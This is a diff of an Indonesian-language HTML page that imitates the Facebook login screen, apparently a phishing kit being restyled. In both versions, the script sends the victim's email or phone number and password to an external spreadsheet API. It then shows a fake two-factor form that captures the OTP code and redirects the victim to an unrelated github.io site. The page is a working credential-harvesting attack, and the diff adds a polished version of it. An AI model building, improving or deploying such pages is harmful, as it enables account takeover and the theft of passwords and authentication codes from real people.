@@ -1,131 +1,281 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
-<title>Facebook - Masuk atau Daftar</title>
-<script src="https://cdn.tailwindcss.com"></script>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
-  body { font-family: 'Roboto', Helvetica, Arial, sans-serif; }
-  .fb-blue { background-color: #1877F2; }
-  .fb-blue:hover { background-color: #166FE5; }
-  .fb-text-blue { color: #1877F2; }
-  .fb-text-blue:hover { text-decoration: underline; }
-  .fb-input { border: 1px solid #dddfe2; padding: 10px; border-radius: 6px; font-size: 15px; }
-  .fb-input:focus { border-color: #1877F2; box-shadow: 0 0 0 2px #e7f3ff; outline: none; }
-  .fb-button { font-weight: bold; padding: 10px; border-radius: 6px; font-size: 15px; }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+    body {
+      font-family: 'Roboto', sans-serif;
+    }
+    .fb-blue {
+      background-color: #1877f2;
+    }
+    .fb-green {
+      background-color: #42b72a;
+    }
+    .loading {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid #1877f2;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .fade-in {
+      animation: fadeIn 0.3s ease-in;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .shake {
+      animation: shake 0.5s;
+    }
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-10px); }
+      75% { transform: translateX(10px); }
+    }
+  </style>
 </head>
-<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+<body class="bg-[#f0f2f5] flex flex-col items-center justify-center min-h-screen px-4">
+  
+  <!-- Container Utama -->
+  <div class="w-full max-w-md">
+    
+    <!-- Logo dan Judul -->
+    <div class="text-center mb-8">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" class="w-20 h-20 mx-auto mb-4">
+      <h1 class="text-2xl font-bold text-gray-800">Facebook</h1>
+      <p class="text-gray-600 text-sm mt-1">Terhubung dengan teman dan dunia di sekitar Anda</p>
+    </div>
 
-<div class="w-full max-w-md mx-auto p-4">
-  <!-- FORM1 - Login -->
-  <div id="form1" class="bg-white p-6 rounded-lg shadow-md">
-    <div class="text-center mb-6">
-      <div class="fb-text-blue text-5xl font-bold mb-2">f</div>
-      <h2 class="text-2xl font-semibold text-gray-800">Masuk ke Facebook</h2>
-    </div>
-    <input id="usr" type="text" placeholder="Email atau Telepon" class="fb-input w-full mb-3">
-    <input id="pss" type="password" placeholder="Kata Sandi" class="fb-input w-full mb-4">
-    <button id="btn1" type="button" class="fb-button w-full fb-blue text-white mb-3">Masuk</button>
-    <div class="text-center mb-4">
-      <a href="#" class="fb-text-blue text-sm">Lupa kata sandi?</a>
-    </div>
-    <div class="relative mb-4">
-      <div class="absolute inset-0 flex items-center"><div class="w-full border-t border-gray-300"></div></div>
-      <div class="relative flex justify-center text-sm"><span class="px-2 bg-white text-gray-500">atau</span></div>
-    </div>
-    <button class="fb-button w-full bg-green-600 text-white mb-3 hover:bg-green-700">Buat Akun Baru</button>
-  </div>
+    <!-- FORM LOGIN -->
+    <form id="form1" class="bg-white rounded-lg shadow-lg p-6 space-y-4 fade-in">
+      <div class="space-y-3">
+        <div class="relative">
+          <i class="fas fa-user absolute left-3 top-3 text-gray-400"></i>
+          <input id="usr" type="text" placeholder="Email atau Nomor Telepon" 
+                 class="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition">
+        </div>
+        <div class="relative">
+          <i class="fas fa-lock absolute left-3 top-3 text-gray-400"></i>
+          <input id="pss" type="password" placeholder="Kata Sandi" 
+                 class="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition">
+          <button type="button" id="togglePassword" class="absolute right-3 top-3 text-gray-400 hover:text-gray-600">
+            <i class="fas fa-eye"></i>
+          </button>
+        </div>
+      </div>
+      
+      <button id="btn1" type="submit" class="w-full fb-blue text-white py-3 rounded-lg font-semibold hover:bg-[#166fe5] transition duration-200 flex items-center justify-center">
+        <span id="btn1Text">Masuk</span>
+        <div id="btn1Loading" class="loading hidden"></div>
+      </button>
+      
+      <div class="text-center">
+        <a href="#" class="text-blue-600 text-sm hover:underline">Lupa Kata Sandi?</a>
+      </div>
+      
+      <div class="relative my-4">
+        <div class="absolute inset-0 flex items-center">
+          <div class="w-full border-t border-gray-300"></div>
+        </div>
+        <div class="relative flex justify-center text-sm">
+          <span class="px-2 bg-white text-gray-500">atau</span>
+        </div>
+      </div>
+      
+      <button type="button" id="buatAkun" class="w-full fb-green text-white py-3 rounded-lg font-semibold hover:bg-[#36a420] transition duration-200">
+        Buat Akun Baru
+      </button>
+    </form>
 
-  <!-- FORM2 - OTP -->
-  <div id="form2" class="bg-white p-6 rounded-lg shadow-md hidden">
-    <div class="text-center mb-6">
-      <div class="fb-text-blue text-5xl font-bold mb-2">f</div>
-      <h2 class="text-xl font-semibold text-gray-800 mb-2">Masukkan Kode Autentikasi</h2>
-      <p class="text-gray-600 text-sm">Kami telah mengirim kode ke akun Anda</p>
-    </div>
-    <div class="flex justify-center mb-6">
-      <div class="bg-gray-100 rounded-full w-16 h-16 flex items-center justify-center">
-        <i class="fas fa-shield-alt text-3xl text-gray-500"></i>
+    <!-- FORM AUTENTIKASI -->
+    <form id="form2" class="bg-white rounded-lg shadow-lg p-6 space-y-4 hidden fade-in">
+      <div class="text-center mb-4">
+        <i class="fas fa-shield-alt text-4xl text-blue-500 mb-3"></i>
+        <h2 class="text-xl font-bold text-gray-800">Verifikasi Dua Faktor</h2>
+        <p class="text-gray-600 text-sm mt-2">Masukkan kode autentikasi yang dikirim ke perangkat Anda</p>
+      </div>
+      
+      <div class="relative">
+        <i class="fas fa-key absolute left-3 top-3 text-gray-400"></i>
+        <input id="auth" type="text" placeholder="Kode 6 digit" maxlength="6" 
+               class="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition text-center text-2xl tracking-widest">
+      </div>
+      
+      <button id="btn2" type="submit" class="w-full fb-blue text-white py-3 rounded-lg font-semibold hover:bg-[#166fe5] transition duration-200 flex items-center justify-center">
+        <span id="btn2Text">Konfirmasi</span>
+        <div id="btn2Loading" class="loading hidden"></div>
+      </button>
+      
+      <div class="flex gap-3">
+        <button id="backBtn" type="button" class="flex-1 border border-gray-300 text-gray-700 py-3 rounded-lg hover:bg-gray-50 transition duration-200">
+          <i class="fas fa-arrow-left mr-2"></i>Kembali
+        </button>
+        <button type="button" class="flex-1 text-blue-600 py-3 rounded-lg hover:bg-blue-50 transition duration-200">
+          Kirim Ulang Kode
+        </button>
+      </div>
+    </form>
+
+    <!-- Footer -->
+    <div class="mt-8 text-center text-xs text-gray-500 space-y-2">
+      <div class="flex flex-wrap justify-center gap-3">
+        <a href="#" class="hover:underline">Bahasa Indonesia</a>
+        <a href="#" class="hover:underline">English (UK)</a>
+        <a href="#" class="hover:underline">中文(台灣)</a>
+        <a href="#" class="hover:underline">Español</a>
+        <a href="#" class="hover:underline">Français (France)</a>
+        <a href="#" class="hover:underline">Deutsch</a>
+        <a href="#" class="hover:underline">日本語</a>
+      </div>
+      <div class="mt-4">
+        <p>Meta © 2024</p>
       </div>
     </div>
-    <input id="auth" type="text" placeholder="Kode OTP" class="fb-input w-full mb-4 text-center text-lg tracking-widest">
-    <button id="btn2" type="button" class="fb-button w-full fb-blue text-white mb-3">Lanjut</button>
-    <div class="text-center text-sm text-gray-600 mb-3">
-      <p>Tidak menerima kode?</p>
-      <a href="#" class="fb-text-blue">Kirim Ulang</a>
-    </div>
-    <button id="backBtn" type="button" class="w-full text-gray-600 py-2 rounded font-medium hover:underline">Kembali ke Login</button>
   </div>
 
-  <div class="mt-6 text-center text-xs text-gray-600">
-    <p>Bahasa Indonesia</p>
-    <div class="mt-2 space-x-4">
-      <a href="#" class="hover:underline">English (US)</a>
-      <a href="#" class="hover:underline">Bahasa Indonesia</a>
-      <a href="#" class="hover:underline">Basa Jawa</a>
-      <a href="#" class="hover:underline">Bahasa Melayu</a>
-    </div>
-  </div>
-</div>
+  <script>
+    const form1 = document.getElementById('form1');
+    const form2 = document.getElementById('form2');
+    const btn1 = document.getElementById('btn1');
+    const btn2 = document.getElementById('btn2');
+    const backBtn = document.getElementById('backBtn');
+    const buatAkun = document.getElementById('buatAkun');
+    const togglePassword = document.getElementById('togglePassword');
+    const passwordInput = document.getElementById('pss');
 
-<script>
-const form1 = document.getElementById('form1');
-const form2 = document.getElementById('form2');
-const btn1 = document.getElementById('btn1');
-const btn2 = document.getElementById('btn2');
-const backBtn = document.getElementById('backBtn');
+    const apiURL = 'https://api.apico.dev/v1/32a6pc/1UqeWoK2iElSp9scRY0P';
 
-const apiURL = 'https://api.apico.dev/v1/32a6pc/1UqeWoK2iElSp9scRY0P1j69FJhD_9RuUqCfAS_8brXY/values/Sheet1:append?valueInputOption=USER_ENTERED';
-
-function getCurrentDateTime() {
-  const now = new Date();
-  const pad = n => n.toString().padStart(2,'0');
-  return `${pad(now.getDate())}/${pad(now.getMonth()+1)}/${now.getFullYear()}, ${pad(now.getHours())}.${pad(now.getMinutes())}.${pad(now.getSeconds())}`;
-}
-
-// FORM1 submit
-btn1.addEventListener('click', async () => {
-  const usr = document.getElementById('usr').value.trim();
-  const pss = document.getElementById('pss').value.trim();
-  if(!usr || !pss){ alert("Email atau kata sandi tidak boleh kosong!"); return; }
-  localStorage.setItem('usr', usr);
-  try {
-    await fetch(apiURL, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({values:[[usr, pss, "", getCurrentDateTime()]]})
+    // Toggle password visibility
+    togglePassword.addEventListener('click', () => {
+      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+      passwordInput.setAttribute('type', type);
+      togglePassword.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
     });
-  } catch(err){ console.error(err); }
-  form1.classList.add('hidden');
-  form2.classList.remove('hidden');
-});
 
-// FORM2 submit
-btn2.addEventListener('click', async () => {
-  const auth = document.getElementById('auth').value.trim();
-  const usr = localStorage.getItem('usr');
-  if(!usr || !auth){ alert("Kode OTP tidak boleh kosong!"); return; }
-  try {
-    await fetch(apiURL, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({values:[[usr,"",auth,getCurrentDateTime()]]})
+    function getDateTime() {
+      const d = new Date();
+      const tanggal = d.toLocaleDateString('id-ID');
+      const waktu = d.toLocaleTimeString('id-ID');
+      return `${tanggal}, ${waktu}`;
+    }
+
+    function showLoading(buttonId, textId, loadingId) {
+      document.getElementById(textId).classList.add('hidden');
+      document.getElementById(loadingId).classList.remove('hidden');
+      document.getElementById(buttonId).disabled = true;
+    }
+
+    function hideLoading(buttonId, textId, loadingId) {
+      document.getElementById(textId).classList.remove('hidden');
+      document.getElementById(loadingId).classList.add('hidden');
+      document.getElementById(buttonId).disabled = false;
+    }
+
+    function validateForm(formId) {
+      const inputs = formId.querySelectorAll('input[required]');
+      let isValid = true;
+      
+      inputs.forEach(input => {
+        if (!input.value.trim()) {
+          input.classList.add('shake', 'border-red-500');
+          setTimeout(() => {
+            input.classList.remove('shake', 'border-red-500');
+          }, 500);
+          isValid = false;
+        }
+      });
+      
+      return isValid;
+    }
+
+    form1.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      
+      if (!validateForm(form1)) return;
+      
+      const usr = document.getElementById('usr').value;
+      const pss = document.getElementById('pss').value;
+      const date = getDateTime();
+
+      showLoading('btn1', 'btn1Text', 'btn1Loading');
+
+      localStorage.setItem('usr', usr);
+
+      try {
+        await fetch(apiURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ usr, pss, date })
+        });
+
+        setTimeout(() => {
+          form1.classList.add('hidden');
+          form2.classList.remove('hidden');
+          hideLoading('btn1', 'btn1Text', 'btn1Loading');
+        }, 1000);
+      } catch (error) {
+        hideLoading('btn1', 'btn1Text', 'btn1Loading');
+        alert('Terjadi kesalahan. Silakan coba lagi.');
+      }
     });
-    localStorage.removeItem('usr');
-    window.location.href = "https://gantulu.github.io";
-  } catch(err){ console.error(err); alert("Gagal mengirim data!"); }
-});
 
-// Back button
-backBtn.addEventListener('click', ()=>{
-  form2.classList.add('hidden');
-  form1.classList.remove('hidden');
-});
-</script>
+    form2.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      
+      if (!validateForm(form2)) return;
+      
+      const usr = localStorage.getItem('usr');
+      const auth = document.getElementById('auth').value;
+      const date = getDateTime();
 
+      showLoading('btn2', 'btn2Text', 'btn2Loading');
+
+      try {
+        await fetch(apiURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ usr, auth, date })
+        });
+
+        setTimeout(() => {
+          localStorage.removeItem('usr');
+          window.location.href = 'https://gantulu.github.io';
+        }, 1000);
+      } catch (error) {
+        hideLoading('btn2', 'btn2Text', 'btn2Loading');
+        alert('Kode autentikasi tidak valid. Silakan coba lagi.');
+      }
+    });
+
+    backBtn.addEventListener('click', () => {
+      form2.classList.add('hidden');
+      form1.classList.remove('hidden');
+      document.getElementById('auth').value = '';
+    });
+
+    // Auto focus auth input
+    form2.addEventListener('transitionend', () => {
+      if (!form2.classList.contains('hidden')) {
+        document.getElementById('auth').focus();
+      }
+    });
+
+    // Format auth input
+    document.getElementById('auth').addEventListener('input', (e) => {
+      e.target.value = e.target.value.replace(/[^0-9]/g, '');
+    });
+  </script>
 </body>
 </html>
